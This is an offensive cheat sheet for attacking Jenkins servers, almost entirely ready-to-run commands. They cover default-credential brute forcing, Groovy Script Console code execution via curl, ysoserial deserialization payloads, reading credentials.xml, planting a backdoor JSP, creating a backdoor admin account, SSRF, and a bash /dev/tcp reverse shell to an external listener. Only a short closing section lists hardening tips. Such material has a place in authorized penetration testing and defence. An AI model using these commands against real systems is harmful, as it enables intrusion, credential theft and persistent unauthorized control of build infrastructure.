# Attacking Jenkins

## 1. Jenkins Exploitation

### Exploiting Weak Credentials

Check for default credentials such as `admin:admin` or `admin:password`.

```bash
msf6 > use auxiliary/scanner/http/jenkins_login
msf6 auxiliary(scanner/http/jenkins_login) > set RHOSTS <target_ip>
msf6 auxiliary(scanner/http/jenkins_login) > run
```

### Exploiting Script Console (Authenticated RCE)

```bash
java -jar jenkins-cli.jar -s http://<target>:8080/jenkins/ groovysh
println "Attacker Shell"
```

Gain RCE via Jenkins Script Console.

### Exploiting Build Job Execution

```bash
curl -X POST http://<target>:8080/jenkins/job/test/build
```

Trigger arbitrary job execution.

---

## 2. Jenkins Deserialization Vulnerabilities

Use **ysoserial** to generate payloads and inject them into vulnerable endpoints.

```bash
java -jar ysoserial-all.jar CommonsCollections5 "<payload>" | base64
```

---

## 3. Jenkins Post-Exploitation and Persistence

### Extract Credentials

```bash
cat /var/lib/jenkins/credentials.xml
```

### Establish Persistence

```bash
cp backdoor.jsp /var/lib/jenkins/jobs/
```

### Modify Access Control

```bash
jenkins.security.AuthorizationStrategy$Unsecured
```

---

## 4. Exploiting Jenkins Script Console

### Remote Command Execution

```bash
curl -X POST -u admin:password --data-urlencode "script=println('Exploit successful')" http://<target>:8080/jenkins/scriptText
```

### Groovy Command Execution (Linux)

```bash
curl -X POST -d "script=println 'id'.execute()" http://<target>:8080/jenkins/scriptText
```

### Groovy Command Execution (Windows)

```bash
curl -X POST -d "script=def cmd = 'cmd.exe /c dir'.execute(); println cmd.text" http://<target>:8080/jenkins/scriptText
```

### Reverse Shell via Groovy (Linux)

```bash
curl -X POST -d "script=r = Runtime.getRuntime(); p = r.exec(['/bin/bash','-c','exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do $line 2>&5 >&5; done'] as String[]); p.waitFor()" http://<target>:8080/jenkins/scriptText
nc -lvnp 8443
```

---

## 5. Exploiting Build Job Misconfigurations

### Create a Malicious Job

```bash
java -jar jenkins-cli.jar -s http://<target>:8080/jenkins/ create-job exploit_job < exploit.xml
```

---

## 6. Exploiting Pipeline Misconfigurations

### Inject a Malicious Groovy Script

```bash
java -jar jenkins-cli.jar -s http://<target>:8080/jenkins/ build exploit_pipeline
```

---

## 7. Extracting Credentials from Jenkins

### Extract Stored Credentials

```bash
curl -u admin:password http://<target>:8080/jenkins/credentials/store/system/domain/_/
```

---

## 8. Persistence and Post-Exploitation

### Create a Backdoor User

```bash
curl -X POST -u admin:password --data-urlencode "script=jenkins.model.Jenkins.instance.securityRealm.createAccount('attacker', 'password')" http://<target>:8080/jenkins/scriptText
```

---

## 9. Unauthenticated Exploits

### Check for Anonymous Access

```bash
curl http://<target>:8080/jenkins/
```

---

## 10. Pipeline Script Injection (Groovy RCE)

```groovy
def cmd = "whoami".execute()
println cmd.text
```

---

## 11. Jenkins Slave Exploitation

Check for misconfigured slave nodes with weak security or open communication channels. Exploit them to gain control over the Jenkins master.

---

## 12. Exploiting Misconfigured Webhooks

Identify webhook-triggered jobs that can be abused for remote code execution or privilege escalation.

---

## 13. Jenkins SSRF and Internal Interaction

```groovy
def url = "http://internal-service.local:8080"
def conn = url.toURL().openConnection()
println conn.getInputStream().text
```

---

## 14. Jenkins Reverse Shell via Build Step Manipulation

Modify build steps in job configurations to inject reverse shell payloads.

---

## 15. Privilege Escalation via Misconfigured Agents

If Jenkins agents operate with elevated privileges, exploit this to run commands as a higher-privileged user.

---

## 16. Arbitrary File Read via Plugin Vulnerabilities

Exploit vulnerable plugins (e.g., *Pipeline: Groovy*) to read sensitive files on the server.

---

## 17. Additional Exploitation Techniques

### CSRF Protection Bypass

Misconfigured Jenkins instances may allow CSRF bypass through referer manipulation or token reuse.

### Authentication Bypass

Check for:
* Anonymous access misconfigurations
* Path traversal
* Header manipulation
* Session hijacking
* Default credentials

## 18. Jenkins Security Hardening
* Keep Jenkins and plugins updated.
* Restrict access to the Script Console.
* Enforce strong authentication and RBAC.
* Use MFA and network segmentation.
* Apply least privilege principles and regular audits.
